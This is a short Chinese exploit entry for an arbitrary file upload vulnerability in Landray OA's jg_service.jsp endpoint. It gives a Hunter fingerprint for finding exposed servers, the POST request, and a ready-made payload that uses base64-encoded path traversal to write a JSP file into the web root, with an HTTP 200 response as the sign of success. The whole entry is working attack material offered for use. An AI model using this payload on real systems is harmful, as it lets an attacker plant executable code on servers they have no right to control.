# 蓝凌OAEKPjg_service任意文件上传漏洞

蓝凌OAEKPjg_service ｜ 文件上传 ｜ —
- **指纹**：`hunter：app.name="Landray 蓝凌OA"`
- **请求**：`POST /sys/attachment/sys_att_main/jg_service.jsp HTTP/1.1`

**Payload**
```
DBSTEP V3.0    124            0              999
DBSTEP=REJTVEVQ
OPTION=U0FWRUFTSFRNTA==
HTMLNAME=Li4vLi4vLi4vLi4vLi4vZWtwL3Jlc291cmNlL2R1ZGVzaXRlLmpzcA==
RECORDID=
DIRECTORY=
<% out.println(111*11);%>
```
- **响应特征**：200